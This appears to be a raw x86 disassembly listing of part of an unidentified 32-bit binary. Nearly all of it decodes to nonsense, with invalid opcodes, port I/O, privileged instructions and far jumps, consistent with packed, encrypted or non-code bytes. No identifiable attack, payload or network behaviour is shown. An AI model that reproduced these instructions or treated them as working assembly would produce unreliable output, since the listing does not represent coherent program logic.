  419f76:	aad    0x9f
  419f78:	cdq    
  419f79:	jno    0x419f1f
  419f7b:	test   eax,0xe9593c2f
  419f80:	imul   esp,esp,0xffffffae
  419f83:	and    cl,BYTE PTR [esi]
  419f85:	sahf   
  419f86:	cmp    eax,0x5f101e03
  419f8b:	cs cmc 
  419f8d:	leave  
  419f8e:	xor    al,0x3e
  419f90:	or     esi,DWORD PTR [ecx-0x22]
  419f93:	inc    ebx
  419f94:	inc    ecx
  419f95:	sbb    eax,0x3ad8834e
  419f9a:	push   0xffffffa3
  419f9c:	sahf   
  419f9d:	or     eax,DWORD PTR [bp+si]
  419fa0:	hlt    
  419fa1:	lods   al,BYTE PTR ds:[esi]
  419fa2:	inc    edi
  419fa3:	in     al,dx
  419fa4:	and    bh,BYTE PTR [eax]
  419fa6:	or     edi,eax
  419fa8:	mov    eax,DWORD PTR gs:[ebx-0x3dde1342]
  419faf:	cmp    dh,cl
  419fb1:	pop    edi
  419fb2:	push   es
  419fb3:	sar    BYTE PTR [ecx],1
  419fb5:	ds jl  0x419f42
  419fb8:	jae    0x419f90
  419fba:	xor    eax,0xd28be393
  419fbf:	add    al,0x3a
  419fc1:	cmc    
  419fc2:	jmp    0x51f6:0xd0e50d4b
  419fc9:	jecxz  0x419fff
  419fcb:	sub    DWORD PTR [esi+0x2c725b32],0x2e
  419fd2:	(bad)  
  419fd4:	jmp    0x6bd0560a
  419fd9:	retf   
  419fda:	outs   dx,DWORD PTR ds:[esi]
  419fdb:	iret   
  419fdc:	mov    bl,0xb0
  419fde:	xor    ebx,DWORD PTR [edi]
  419fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe1:	xchg   edi,eax
  419fe2:	hlt    
  419fe3:	into   
  419fe4:	cdq    
  419fe5:	push   es
  419fe6:	je     0x419ff3
  419fe8:	push   edi
  419fe9:	arpl   WORD PTR [ecx],dx
  419feb:	mov    bh,BYTE PTR [eax]
  419fed:	inc    edi
  419fee:	push   ss
  419fef:	mov    dl,0xe7
  419ff1:	xchg   ebp,eax
  419ff2:	in     al,dx
  419ff3:	push   0x50
  419ff5:	jmp    ebx
  419ff7:	outs   dx,BYTE PTR ds:[esi]
  419ff8:	mov    bl,0x6c
  419ffa:	add    eax,0xea6c65b8
  419fff:	aaa    
  41a000:	cld    
  41a001:	push   es
  41a002:	lock in eax,dx
  41a004:	in     eax,dx
  41a005:	mov    al,0xae
  41a007:	cli    
  41a008:	gs cmp cl,dh
  41a00b:	fsubr  st,st(3)
  41a00d:	mov    al,ds:0x49f6adb7
  41a012:	fwait
  41a013:	sbb    bh,dl
  41a015:	mov    al,ds:0x59ec9248
  41a01a:	sbb    BYTE PTR [ecx-0x5564a3b9],cl
  41a020:	adc    BYTE PTR [ebp-0x7e08a038],ah
  41a026:	shr    DWORD PTR ds:0xc5d1b1c1,cl
  41a02c:	int3   
  41a02d:	in     al,dx
  41a02e:	scas   al,BYTE PTR es:[edi]
  41a02f:	scas   al,BYTE PTR es:[edi]
  41a030:	mov    ebx,0x8b8690c0
  41a035:	or     eax,0xc1534331
  41a03a:	fist   DWORD PTR [ebx-0x29]
  41a03d:	lock das 
  41a03f:	lods   al,BYTE PTR ds:[esi]
  41a040:	xlat   BYTE PTR ds:[ebx]
  41a041:	les    edi,FWORD PTR [edi-0x3a4f7ec6]
  41a047:	scas   eax,DWORD PTR es:[edi]
  41a048:	adc    ecx,edx
  41a04a:	dec    eax
  41a04b:	fwait
  41a04c:	adc    eax,0xf44a1426
  41a051:	dec    eax
  41a052:	mul    DWORD PTR [edx-0x41]
  41a055:	pop    edi
  41a056:	push   ss
  41a057:	cmp    eax,0xa5ff3da9
  41a05c:	mov    bh,0x75
  41a05e:	mov    eax,0xf257dcac
  41a063:	shl    DWORD PTR [ebx-0x305f76],0x9d
  41a06a:	cmc    
  41a06b:	pop    es
  41a06c:	mov    ds:0xf315eefe,eax
  41a071:	aas    
  41a072:	pop    esp
  41a073:	in     al,dx
  41a074:	cmove  esp,DWORD PTR [esi+esi*2]
  41a078:	xlat   BYTE PTR ds:[ebx]
  41a079:	push   esp
  41a07a:	xor    al,0x5d
  41a07c:	icebp  
  41a07d:	leave  
  41a07e:	out    0xea,eax
  41a080:	mul    DWORD PTR [edi-0x4e887886]
  41a086:	test   eax,0x754d0fc0
  41a08b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a08c:	(bad)  
  41a08e:	pushf  
  41a08f:	cli    
  41a090:	push   ebp
  41a091:	add    BYTE PTR [ecx-0xf],ch
  41a094:	aad    0x50
  41a096:	cmp    DWORD PTR [ecx-0xfaf848e],esi
  41a09c:	cmp    ch,al
  41a09e:	inc    edi
  41a09f:	lea    ecx,[ebx+eax*4-0x72]
  41a0a3:	sbb    edi,edi
  41a0a5:	test   bl,0x9a
  41a0a8:	push   0xfffffff9
  41a0aa:	mov    esp,0xe16edaf
  41a0af:	lea    ebx,[ecx+0x58803159]
  41a0b5:	cmp    BYTE PTR [esi],ch
  41a0b7:	std    
  41a0b8:	lods   eax,DWORD PTR ds:[esi]
  41a0b9:	mov    dh,0xfc
  41a0bb:	loope  0x41a0bf
  41a0bd:	out    0xc0,al
  41a0bf:	sbb    dh,ch
  41a0c1:	xor    BYTE PTR [edx+ebp*4+0xa],ch
  41a0c5:	cmp    al,BYTE PTR [ecx-0x68526a4c]
  41a0cb:	ret    
  41a0cc:	xchg   ebx,eax
  41a0cd:	icebp  
  41a0ce:	aad    0x43
  41a0d0:	jmp    0x41a091
  41a0d2:	pop    es
  41a0d3:	stc    
  41a0d4:	fwait
  41a0d5:	mov    eax,ds:0x63bd990a
  41a0da:	xchg   ebp,eax
  41a0db:	or     ebp,ecx
  41a0dd:	xor    eax,0x255aa88a
  41a0e2:	pop    ebp
  41a0e3:	mov    al,0xf0
  41a0e5:	add    eax,0xbecd717e
  41a0ea:	(bad)  
  41a0eb:	test   BYTE PTR [eax+ebp*2+0x71],dl
  41a0ef:	cmp    DWORD PTR [ecx],eax
  41a0f1:	mov    al,ds:0x9585a7ee
  41a0f6:	push   esi
  41a0f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0f8:	and    BYTE PTR [edx+0x23],0xee
  41a0fc:	(bad)  
  41a0fd:	ror    DWORD PTR [ebx-0x690246f6],cl
  41a103:	add    bh,dh
  41a105:	adc    eax,0xe1e5b5a1
  41a10a:	jae    0x41a16d
  41a10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a10d:	jg     0x41a13b
  41a10f:	aaa    
  41a110:	test   eax,0xceb4a8a4
  41a115:	imul   DWORD PTR [esi]
  41a117:	mov    WORD PTR [ebx],ss
  41a119:	dec    edx
  41a11a:	adc    BYTE PTR [edx+0x59],al
  41a11d:	mov    ecx,0xc5ede7a4
  41a122:	(bad)  ds:0x1be580dc
  41a128:	jnp    0x41a124
  41a12a:	sahf   
  41a12b:	cwde   
  41a12c:	mov    eax,ds:0x177724cb
  41a131:	add    eax,0x8ea3359e
  41a136:	fwait
  41a137:	enter  0xedb,0x4c
  41a13b:	sahf   
  41a13c:	daa    
  41a13d:	in     eax,0xf9
  41a13f:	xchg   edi,eax
  41a140:	xlat   BYTE PTR ds:[ebx]
  41a141:	std    
  41a142:	and    ch,BYTE PTR [ebp-0x642a57cf]
  41a148:	dec    ebp
  41a149:	lea    ecx,[edi]
  41a14b:	and    al,0xe7
  41a14d:	sub    esi,0x72fc394f
  41a153:	add    al,BYTE PTR [ecx+0x41]
  41a156:	add    eax,0xa95b4be8
  41a15b:	xchg   ebx,eax
  41a15c:	sub    BYTE PTR ds:0xf8786d6f,al
  41a162:	ror    DWORD PTR [ecx],cl
  41a164:	pop    ebp
  41a165:	sub    BYTE PTR ds:0xa7bbb3b4,ch
  41a16b:	xor    DWORD PTR [eax+edi*4-0x7a],ebp
  41a16f:	adc    ecx,esp
  41a171:	clc    
  41a172:	push   0x5abeaf7
  41a177:	add    al,0xcc
  41a179:	das    
  41a17a:	adc    esp,DWORD PTR [edi-0x5]
  41a17d:	pop    ebp
  41a17e:	cmc    
  41a17f:	fstp   st(4)
  41a181:	shl    BYTE PTR [ebx],0xdc
  41a184:	test   DWORD PTR [eax+0x3d777e54],edx
  41a18a:	push   esi
  41a18b:	fsub   st,st(2)
  41a18d:	je     0x41a1b0
  41a18f:	mov    ecx,DWORD PTR [edi]
  41a191:	in     eax,0xc0
  41a193:	xor    eax,0x612d2c2
  41a198:	frstor [ebx+edx*8-0x3b]
  41a19c:	xor    BYTE PTR [ebx],cl
  41a19e:	sbb    DWORD PTR [edx-0x606fd787],ebp
  41a1a4:	ss ret 
  41a1a6:	xor    dl,bl
  41a1a8:	or     eax,0x50ae8d3c
  41a1ad:	mov    ebp,0xa51a6558
  41a1b2:	mov    ds:0x1bf3c20f,eax
  41a1b7:	and    al,0x67
  41a1b9:	fucomp st(7)
  41a1bb:	add    eax,0x1451eb49
  41a1c0:	mov    al,0xa9
  41a1c2:	lock repnz adc al,0xad
  41a1c6:	jns    0x41a17a
  41a1c8:	out    dx,al
  41a1c9:	les    ebx,FWORD PTR ds:0x63df1391
  41a1cf:	sbb    ch,BYTE PTR ds:0x61bf10ae
  41a1d5:	imul   esp,edi,0x3b9524c7
  41a1db:	ror    DWORD PTR [ebx+0x4d89f44d],1
  41a1e1:	or     BYTE PTR [ebx-0x7bf0f7b3],cl
  41a1e7:	jb     0x41a255
  41a1e9:	add    BYTE PTR [eax],al
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	loopne 0x41a245
  41a209:	mov    ah,0x88
  41a20b:	outs   dx,BYTE PTR ds:[esi]
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	aas    
  41a214:	imul   eax,DWORD PTR [ecx+0x5d],0x382663fd
  41a21b:	pop    edx
  41a21c:	mov    ?,ebx
  41a21e:	(bad)  
  41a21f:	aaa    
  41a220:	sub    eax,0xcd3c007d
  41a225:	push   ebx
  41a226:	cmp    eax,0xc9643918
  41a22b:	xchg   edx,eax
  41a22c:	push   0xffffffcb
  41a22e:	int    0x77
  41a230:	iret   
  41a231:	bnd jge 0x41a25b
  41a234:	push   ebx
  41a235:	test   DWORD PTR [eax-0x488af1dc],esp
  41a23b:	push   ds
  41a23c:	and    eax,0x18ca8e89
  41a241:	mov    cs,ebp
  41a243:	test   al,0xc6
  41a245:	scas   eax,DWORD PTR es:[edi]
  41a246:	cmp    BYTE PTR [ebp+0x11085868],bl
  41a24c:	add    al,0x17
  41a24e:	pushf  
  41a24f:	xchg   BYTE PTR [esp+esi*1-0x2b],dh
  41a253:	cld    
  41a254:	imul   ebx,DWORD PTR [edi-0x54],0x7a
  41a258:	xchg   ebp,eax
  41a259:	mov    ecx,ebx
  41a25b:	mov    ebx,0x4b2872b4
  41a260:	fisubr DWORD PTR [ebx-0x7bfd2395]
  41a266:	mov    ebp,0x2cda5b3
  41a26b:	or     ebp,0x1267071e
  41a271:	and    DWORD PTR [edi],eax
  41a273:	push   ebp
  41a274:	xor    edi,edi
  41a276:	add    BYTE PTR [eax],bh
  41a278:	cmc    
  41a279:	jne    0x41a208
  41a27b:	add    eax,0xf6ec4e49
  41a280:	popa   
  41a281:	ror    DWORD PTR [ecx],0x2c
  41a284:	pop    ecx
  41a285:	test   BYTE PTR [eax-0x68],cl
  41a288:	adc    DWORD PTR [eax+0x1a],edx
  41a28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a28c:	and    eax,0x87a2c1b3
  41a291:	pop    edi
  41a292:	and    al,0xa1
  41a294:	nop
  41a295:	mov    bh,0xc0
  41a297:	pop    edi
  41a298:	dec    ebp
  41a299:	or     DWORD PTR [ebp-0x5e],ebp
  41a29c:	pop    esi
  41a29d:	sbb    BYTE PTR [edi],dl
  41a29f:	xchg   esi,eax
  41a2a0:	daa    
  41a2a1:	data16 ins BYTE PTR es:[edi],dx
  41a2a3:	das    
  41a2a4:	pop    ebp
  41a2a5:	jecxz  0x41a2b7
  41a2a7:	sbb    edi,DWORD PTR [edx+0x4f]
  41a2aa:	std    
  41a2ab:	push   ebp
  41a2ac:	mov    bh,0x3
  41a2ae:	out    0x6a,eax
  41a2b0:	shr    DWORD PTR [edi-0x69],cl
  41a2b3:	adc    ch,bh
  41a2b5:	fldcw  WORD PTR [eax]
  41a2b7:	mov    dh,BYTE PTR [eax+0x35d772fc]
  41a2bd:	pop    es
  41a2be:	ja     0x41a336
  41a2c0:	xchg   ecx,eax
  41a2c1:	pusha  
  41a2c2:	and    eax,0x1acf5c30
  41a2c7:	adc    eax,DWORD PTR [edi-0xa]
  41a2ca:	clc    
  41a2cb:	add    al,0x6f
  41a2cd:	or     BYTE PTR [edi-0x79],al
  41a2d0:	cld    
  41a2d1:	cwde   
  41a2d2:	dec    ecx
  41a2d3:	mov    bh,0xaa
  41a2d5:	fwait
  41a2d6:	lods   eax,DWORD PTR ds:[esi]
  41a2d7:	ins    BYTE PTR es:[edi],dx
  41a2d8:	pop    ds
  41a2d9:	nop
  41a2da:	cmc    
  41a2db:	lock cld 
  41a2dd:	xchg   BYTE PTR [esi+eiz*1-0x3a3d4e78],ch
  41a2e4:	fs inc esp
  41a2e6:	dec    edx
  41a2e7:	ins    DWORD PTR es:[edi],dx
  41a2e8:	pop    edi
  41a2e9:	add    edx,eax
  41a2eb:	icebp  
  41a2ec:	sub    ebp,DWORD PTR [ebx-0x67af8d1a]
  41a2f2:	jmp    0x9893:0x63bcb9a6
  41a2f9:	test   eax,0xcb4af4a5
  41a2fe:	sub    BYTE PTR [ebp-0x1e8a7784],bh
  41a304:	(bad)  
  41a305:	repnz and esp,DWORD PTR [esi-0x406633ab]
  41a30c:	cwde   
  41a30d:	stos   BYTE PTR es:[edi],al
  41a30e:	xchg   edi,eax
  41a30f:	inc    edx
  41a310:	pop    esp
  41a311:	imul   ebx,DWORD PTR [esi+edi*1],0xfda18e3
  41a318:	pop    ecx
  41a319:	test   al,0x66
  41a31b:	mov    al,0x6f
  41a31d:	pop    ds
  41a31e:	in     al,dx
  41a31f:	dec    edx
  41a320:	and    bl,BYTE PTR [edi-0x1e]
  41a323:	add    esi,0x22
  41a326:	jp     0x41a350
  41a328:	cli    
  41a329:	jmp    0x845f95e4
  41a32e:	je     0x41a359
  41a330:	sub    DWORD PTR [ecx],ebx
  41a332:	add    ecx,DWORD PTR [edi+edi*8]
  41a335:	gs ret 
  41a337:	xor    eax,DWORD PTR [ecx+0x2]
  41a33a:	lock adc ah,ah
  41a33d:	shl    DWORD PTR [edx-0x17],cl
  41a340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a341:	shl    ah,0x39
  41a344:	add    DWORD PTR [ebx],esp
  41a346:	or     BYTE PTR [ebx-0x2b23cb07],0x81
  41a34d:	gs addr16 push ebx
  41a350:	pop    eax
  41a351:	(bad)  
  41a352:	int    0x72
  41a354:	(bad)  
  41a355:	push   ebx
  41a356:	fcomp  DWORD PTR [esi]
  41a358:	push   ebx
  41a359:	mov    ecx,0xc20ade7e
  41a35e:	out    0xe8,eax
  41a360:	mov    eax,0x54ffeff4
  41a365:	(bad)  
  41a366:	in     al,dx
  41a367:	fild   WORD PTR [ecx-0x4fc1ee6b]
  41a36d:	jno    0x41a32b
  41a36f:	leave  
  41a370:	sub    BYTE PTR ds:0x5e9858f1,bl
  41a376:	int    0xd6
  41a378:	and    BYTE PTR [ebp+eiz*8-0x65728cbd],dh
  41a37f:	bound  esi,QWORD PTR [ecx+0x71]
  41a382:	jge    0x41a394
  41a384:	aam    0x66
  41a386:	add    al,0xff
  41a388:	mov    esp,0xa5743595
  41a38d:	int3   
  41a38e:	dec    eax
  41a38f:	loop   0x41a3bc
  41a391:	pop    ss
  41a392:	in     eax,0x4d
  41a394:	in     eax,0xc5
  41a396:	add    BYTE PTR [edi-0x59],bl
  41a399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a39a:	and    dl,BYTE PTR [eax-0x29]
  41a39d:	push   ds
  41a39e:	repz int 0xff
  41a3a1:	in     al,dx
  41a3a2:	sbb    DWORD PTR [esi-0x74],0x4d
  41a3a6:	icebp  
  41a3a7:	ret    0xf7f7
  41a3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ab:	jns    0x41a3ab
  41a3ad:	sahf   
  41a3ae:	push   ecx
  41a3af:	in     eax,0xe
  41a3b1:	push   ebp
  41a3b2:	jbe    0x41a404
  41a3b4:	aam    0xd4
  41a3b6:	cmp    dl,BYTE PTR [edi-0x29ba71ca]
  41a3bc:	or     edx,DWORD PTR [edx+ebx*4+0x52daf478]
  41a3c3:	ret    
  41a3c4:	not    bl
  41a3c6:	mov    edx,0x31815cc2
  41a3cb:	jge    0x41a3fc
  41a3cd:	add    al,0x26
  41a3cf:	mov    WORD PTR [esp+ebp*8],?
  41a3d2:	out    0x7b,al
  41a3d4:	scas   al,BYTE PTR es:[edi]
  41a3d5:	mov    edi,DWORD PTR [eax-0x7b70e71b]
  41a3db:	in     al,dx
  41a3dc:	mov    eax,0x1630ee3c
  41a3e1:	jbe    0x41a392
  41a3e3:	xor    al,0x37
  41a3e5:	dec    esp
  41a3e6:	(bad)  [ebx+0x467e13e1]
  41a3ec:	mov    edx,0x7367e6cb
  41a3f1:	mov    ecx,0x328cd743
  41a3f6:	(bad)  
  41a3f9:	add    bh,BYTE PTR [edi+esi*1+0x43]
  41a3fd:	sti    
  41a3fe:	pop    edx
  41a3ff:	popa   
  41a400:	icebp  
  41a401:	bound  esi,QWORD PTR [edi-0x21]
  41a404:	push   edx
  41a405:	mov    cl,0x5c
  41a407:	fidivr DWORD PTR [edx-0x76]
  41a40a:	jnp    0x41a462
  41a40c:	mov    ds:0x414b680e,eax
  41a411:	arpl   WORD PTR [eax+0x14dbf7ea],cx
  41a417:	std    
  41a418:	shl    DWORD PTR cs:[eax+0x18],cl
  41a41c:	out    dx,eax
  41a41d:	inc    edi
  41a41e:	sub    eax,0x3dec8a30
  41a423:	adc    BYTE PTR [edx+0x4b1b891e],al
  41a429:	(bad)
  41a42c:	xchg   edx,eax
  41a42d:	(bad)  
  41a42e:	cdq    
  41a42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a430:	pop    edx
  41a431:	retf   0x32af
  41a434:	pop    ecx
  41a435:	(bad)  
  41a436:	jg     0x41a3bb
  41a438:	test   eax,0x5127104e
  41a43d:	adc    BYTE PTR [ebp+0x34],ch
  41a440:	inc    eax
  41a441:	sbb    al,0xe1
  41a443:	and    BYTE PTR [esp+esi*8+0xa],al
  41a447:	popf   
  41a448:	ins    DWORD PTR es:[edi],dx
  41a449:	xlat   BYTE PTR ds:[ebx]
  41a44a:	hlt    
  41a44b:	xchg   DWORD PTR [ecx],edi
  41a44d:	ja     0x41a400
  41a44f:	pop    ds
  41a450:	jle    0x41a4b7
  41a452:	dec    esp
  41a453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a454:	or     ebx,0x167a6462
  41a45a:	imul   edx,DWORD PTR [ebx],0x7cccb1d8
  41a460:	call   DWORD PTR [edx-0x65a9f841]
  41a466:	mov    edi,DWORD PTR [ecx+0x3a]
  41a469:	or     edx,DWORD PTR [edi-0x45ae7629]
  41a46f:	sub    DWORD PTR [ecx-0x38],esp
  41a472:	loopne 0x41a4a2
  41a474:	jmp    0xfb95:0xc6dfa0b1
  41a47b:	inc    edi
  41a47c:	sti    
  41a47d:	hlt    
  41a47e:	cmp    eax,0x43358f0e
  41a483:	adc    ebp,DWORD PTR [edi+0x6ac67a3e]
  41a489:	inc    ebp
  41a48a:	xchg   edi,eax
  41a48b:	in     al,0x8e
  41a48d:	dec    eax
  41a48e:	mov    eax,0x45a08247
  41a493:	ins    DWORD PTR es:[edi],dx
  41a494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a495:	rcr    BYTE PTR ds:0xa633a515,1
  41a49b:	dec    ebx
  41a49c:	pop    esi
  41a49d:	imul   ecx,DWORD PTR [edi-0x792e2fd0],0x559a0bd9
  41a4a7:	lods   al,BYTE PTR ds:[esi]
  41a4a8:	push   eax
  41a4a9:	adc    ebp,DWORD PTR [esi]
  41a4ab:	shl    BYTE PTR [esi+0x79],1
  41a4ae:	mov    ds:0x698c8e8d,al
  41a4b3:	sub    al,0xaf
  41a4b5:	loopne 0x41a453
  41a4b7:	sub    al,0x6f
  41a4b9:	aas    
  41a4ba:	ja     0x41a4f0
  41a4bc:	dec    ebx
  41a4bd:	adc    esi,DWORD PTR [eax]
  41a4bf:	sbb    al,0x20
  41a4c1:	mov    bh,0xeb
  41a4c3:	outs   dx,BYTE PTR ds:[esi]
  41a4c4:	shl    BYTE PTR [esp+ebp*4],cl
  41a4c7:	jae    0x41a4de
  41a4c9:	and    esi,DWORD PTR [edx]
  41a4cb:	mov    ebx,0x590af5df
  41a4d0:	loopne 0x41a45c
  41a4d2:	fucomp st(0)
  41a4d4:	outs   dx,DWORD PTR ds:[esi]
  41a4d5:	in     eax,dx
  41a4d6:	(bad)  
  41a4d7:	push   edx
  41a4d8:	push   0x4b75959a
  41a4dd:	dec    ecx
  41a4de:	pop    ecx
  41a4df:	sahf   
  41a4e0:	js     0x41a510
  41a4e2:	aad    0x27
  41a4e4:	adc    eax,DWORD PTR ds:0xdcecd8a7
  41a4ea:	mov    ch,0x13
  41a4ec:	sub    esp,eax
  41a4ee:	sub    eax,0x61b4cdbc
  41a4f3:	test   BYTE PTR [ebx],cl
  41a4f5:	fdivp  st(0),st
  41a4f7:	adc    al,0xa1
  41a4f9:	jo     0x41a52f
  41a4fb:	jecxz  0x41a578
  41a4fd:	dec    DWORD PTR [eax]
  41a4ff:	ficom  WORD PTR [edx+0x37]
  41a502:	retf   
  41a503:	add    BYTE PTR [eax],al
  41a505:	jp     0x41a4c3
  41a507:	dec    edi
  41a508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a509:	jne    0x41a4d9
  41a50b:	fstp   QWORD PTR [ebp-0x2efb6ddb]
  41a511:	fisubr WORD PTR [edx+0x23]
  41a514:	sbb    DWORD PTR ds:0x47735219,ebp
  41a51a:	xchg   esi,eax
  41a51b:	aaa    
  41a51c:	test   DWORD PTR [eax-0x5f882f65],ebp
  41a522:	aad    0xd5
  41a524:	mov    dh,0x23
  41a526:	xlat   BYTE PTR ds:[ebx]
  41a527:	xchg   esi,eax
  41a528:	fbld   TBYTE PTR [ebp-0x2684bd7d]
  41a52e:	loope  0x41a4bc
  41a530:	jecxz  0x41a57f
  41a532:	xor    BYTE PTR [ebx-0x2f74bcd8],ch
  41a538:	push   eax
  41a539:	or     esi,esp
  41a53b:	out    dx,eax
  41a53c:	xor    bl,BYTE PTR [ecx+0x40]
  41a53f:	daa    
  41a540:	scas   al,BYTE PTR es:[edi]
  41a541:	push   ss
  41a542:	cmc    
  41a543:	xor    ch,BYTE PTR [esi-0xc]
  41a546:	dec    esi
  41a547:	bound  edx,QWORD PTR [ecx+0x2eb15b69]
  41a54d:	sbb    ch,0x58
  41a550:	aad    0xf1
  41a552:	jns    0x41a500
  41a554:	idiv   esi
  41a556:	retf   
  41a557:	sbb    eax,0x67e6de06
  41a55c:	pop    ss
  41a55d:	cld    
  41a55e:	fidiv  DWORD PTR [esi+0x1]
  41a561:	xor    BYTE PTR [esi],dh
  41a563:	mov    esp,0x2f975796
  41a568:	pusha  
  41a569:	adc    al,0xa4
  41a56b:	mov    eax,0x908baa3e
  41a570:	cmp    al,0x19
  41a572:	inc    edx
  41a573:	or     ch,ch
  41a575:	sbb    al,0x6b
  41a577:	clc    
  41a578:	imul   esp,DWORD PTR [ebx],0xffffffe8
  41a57b:	bound  eax,QWORD PTR [esi]
  41a57d:	leave  
  41a57e:	or     DWORD PTR [ebx-0x608a2fec],ecx
  41a584:	out    0xe6,eax
  41a586:	pop    edx
  41a587:	mov    dh,BYTE PTR [ebx]
  41a589:	mov    BYTE PTR [ebx+0x19d8a785],ch
  41a58f:	jnp    0x41a5f5
  41a591:	dec    ebp
  41a592:	ret    
  41a593:	aam    0x3c
  41a595:	xchg   esi,eax
  41a596:	out    0x75,al
  41a598:	das    
  41a599:	icebp  
  41a59a:	cld    
  41a59b:	cld    
  41a59c:	shl    DWORD PTR [ebx+0x36],1
  41a59f:	inc    ebx
  41a5a0:	push   ebx
  41a5a1:	lds    ebx,FWORD PTR [ebp+0x10]
  41a5a4:	lods   eax,DWORD PTR ds:[esi]
  41a5a5:	jle    0x41a5db
  41a5a7:	into   
  41a5a8:	cs out 0x9b,al
  41a5ab:	jg     0x41a5a9
  41a5ad:	and    esp,DWORD PTR [eax+0x60e5e5f7]
  41a5b3:	psubd  mm7,QWORD PTR [ecx+0x57]
  41a5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b8:	les    eax,FWORD PTR ds:0x2da702e9
  41a5be:	xor    DWORD PTR [eax-0x47],esi
  41a5c1:	xlat   BYTE PTR ds:[ebx]
  41a5c2:	cmp    esi,esp
  41a5c4:	push   ss
  41a5c5:	minps  xmm5,XMMWORD PTR [esi-0x7e]
  41a5c9:	dec    ebx
  41a5ca:	sbb    dh,BYTE PTR [ebp+0x1c]
  41a5cd:	xor    DWORD PTR [ecx],edx
  41a5cf:	nop
  41a5d0:	dec    DWORD PTR [ecx]
  41a5d2:	xchg   edx,esp
  41a5d4:	xor    BYTE PTR [ecx-0x65639a95],cl
  41a5da:	(bad)  
  41a5db:	xor    BYTE PTR [ecx-0x75],bl
  41a5de:	mov    dh,0x40
  41a5e0:	cmp    bl,BYTE PTR [ecx+0xe]
  41a5e3:	daa    
  41a5e4:	cmp    BYTE PTR [eax+0x6f3791ac],cl
  41a5ea:	punpcklbw mm0,DWORD PTR [ebx-0x2e49dcf7]
  41a5f1:	push   ds
  41a5f2:	jno    0x41a63d
  41a5f4:	rol    BYTE PTR [edi+0x4],cl
  41a5f7:	xchg   edi,eax
  41a5f8:	pushf  
  41a5f9:	outs   dx,DWORD PTR ds:[esi]
  41a5fa:	sbb    dh,BYTE PTR [ebp+edi*8+0x1a4633ff]
  41a601:	push   ds
  41a602:	mov    cl,0xde
  41a604:	mov    cl,0xfd
  41a606:	sub    BYTE PTR [eax+0x42],dh
  41a609:	mov    DWORD PTR [ecx],ebx
  41a60b:	in     eax,0x33
  41a60d:	or     esi,DWORD PTR [ebx]
  41a60f:	adc    ecx,DWORD PTR [eax+0x508d801c]
  41a615:	into   
  41a616:	ror    ah,1
  41a618:	cmc    
  41a619:	jecxz  0x41a693
  41a61b:	and    ebp,DWORD PTR [edi-0x79]
  41a61e:	stos   DWORD PTR es:[edi],eax
  41a61f:	xor    BYTE PTR [edi+0x1b2e42ba],cl
  41a625:	sub    esi,esp
  41a627:	and    eax,0x95792b61
  41a62c:	jg     0x41a602
  41a62e:	jo     0x41a5dc
  41a630:	lock or DWORD PTR [esi+eiz*4-0x70],ecx
  41a635:	xor    DWORD PTR [ebp+0x62],edi
  41a638:	add    al,0x2d
  41a63a:	loop   0x41a5c9
  41a63c:	test   al,ch
  41a63e:	iret   
  41a63f:	loopne 0x41a680
  41a641:	rcl    dl,0x83
  41a644:	push   esp
  41a645:	xor    DWORD PTR [ecx],esi
  41a647:	adc    al,0x4f
  41a649:	popf   
  41a64a:	mov    ebp,0xe08cc54b
  41a64f:	dec    esp
  41a650:	out    0x58,al
  41a652:	pop    edx
  41a653:	push   eax
  41a654:	(bad)  
  41a655:	icebp  
  41a656:	test   BYTE PTR [edx],0x67
  41a659:	lds    esp,FWORD PTR [ebx-0x54868fd2]
  41a65f:	out    0x65,al
  41a661:	cli    
  41a662:	adc    dl,BYTE PTR gs:[eax-0x34]
  41a666:	pop    ecx
  41a667:	mov    ds:0x9e55b95b,al
  41a66c:	arpl   cx,di
  41a66e:	popa   
  41a66f:	mov    edi,0x3756bf96
  41a674:	xor    ebx,ecx
  41a676:	(bad)  
  41a677:	fdivp  st(4),st
  41a679:	fisub  WORD PTR [esi]
  41a67b:	repz dec edi
  41a67d:	lahf   
  41a67e:	sbb    BYTE PTR [edx-0x32242bba],dh
  41a684:	push   edx
  41a685:	in     eax,0x3a
  41a687:	jle    0x41a646
  41a689:	xchg   dl,ch
  41a68b:	jno    0x41a628
  41a68d:	or     DWORD PTR [ebx],ecx
  41a68f:	popfw  
  41a691:	sbb    esi,DWORD PTR [ecx+0x23190230]
  41a697:	(bad)  
  41a698:	mov    edi,0x12e929d8
  41a69d:	mov    bl,0xad
  41a69f:	outs   dx,DWORD PTR ds:[esi]
  41a6a0:	jns    0x41a629
  41a6a2:	mov    dl,0xe6
  41a6a4:	dec    ecx
  41a6a5:	or     al,0xdc
  41a6a7:	dec    ebx
  41a6a8:	(bad)  
  41a6a9:	jmp    0x41a6a3
  41a6ab:	je     0x41a6bd
  41a6ad:	push   cs
  41a6ae:	mov    dh,0x50
  41a6b0:	pop    edx
  41a6b1:	cs pop eax
  41a6b3:	aaa    
  41a6b4:	ret    
  41a6b5:	or     al,0xd
  41a6b7:	ret    
  41a6b8:	out    0xab,al
  41a6ba:	push   ecx
  41a6bb:	dec    edx
  41a6bc:	aaa    
  41a6bd:	push   ebx
  41a6be:	inc    eax
  41a6bf:	jmp    0x4b14:0xf1baa022
